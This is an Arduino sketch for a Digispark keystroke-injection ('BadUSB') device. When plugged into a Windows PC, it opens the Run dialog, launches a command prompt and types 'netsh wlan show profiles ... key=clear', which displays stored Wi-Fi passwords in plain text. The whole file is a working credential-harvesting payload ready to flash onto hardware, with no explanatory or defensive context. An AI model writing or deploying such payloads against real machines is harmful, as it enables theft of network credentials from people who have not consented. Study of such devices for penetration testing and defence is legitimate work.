#include "DigiKeyboard.h"

void setup() {
  // don't need to set anything up to use DigiKeyboard
}


void loop() {
  
  DigiKeyboard.sendKeyStroke(0);

  DigiKeyboard.sendKeyStroke(KEY_D, MOD_GUI_LEFT);

  DigiKeyboard.delay(500);
  
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  
  DigiKeyboard.delay(1000);

  DigiKeyboard.print(F("cmd"));

  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  DigiKeyboard.delay(1000);

  DigiKeyboard.print(F("netsh wlan show profiles"));

  DigiKeyboard.delay(500);

  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  DigiKeyboard.delay(5000);

  DigiKeyboard.print(F("netsh wlan show profiles "));

  DigiKeyboard.delay(10000);

  DigiKeyboard.print(F(" key=clear"));

  DigiKeyboard.delay(500);

  DigiKeyboard.sendKeyStroke(KEY_ENTER);



  for(;;){ /*empty*/ }
}
